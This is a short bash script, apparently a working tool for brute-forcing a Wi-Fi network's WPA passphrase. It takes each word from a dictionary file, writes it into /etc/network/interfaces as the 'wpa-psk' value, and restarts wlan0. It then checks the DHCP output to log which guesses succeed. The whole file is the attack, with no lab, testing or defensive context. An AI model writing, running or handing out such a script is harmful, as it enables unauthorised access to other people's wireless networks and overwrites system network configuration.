#clean older traces
#touch is use to avoid error messages

touch tried-and-failed.txt
rm tried-and-failed.txt

touch success.txt
rm success.txt

touch other.txt
rm other.txt

touch traces.txt
rm traces.txt

while read line
do 
echo "Test with $line"
cp interfaces-model interfaces
echo -e "wpa-psk \"$line\"" >> interfaces
cp interfaces /etc/network/interfaces
ifdown wlan0 2> /dev/null
ifup wlan0 2> ifup-result.txt

#Trace ifup in traces.txt

echo "$line" >> traces.txt
echo >> traces.txt
cat ifup-result.txt >> traces.txt
echo >> traces.txt
echo "__________" >> traces.txt

#Analyse the ifup result

if grep --quiet "No DHCPOFFERS received" ifup-result.txt; then
	echo $line >> tried-and-failed.txt
else
	if grep --quiet "DHCPOFFER from" ifup-result.txt; then
		echo $line >> success.txt
	else
		echo $line >> other.txt
	fi
fi
done < dico.txt

rm interfaces
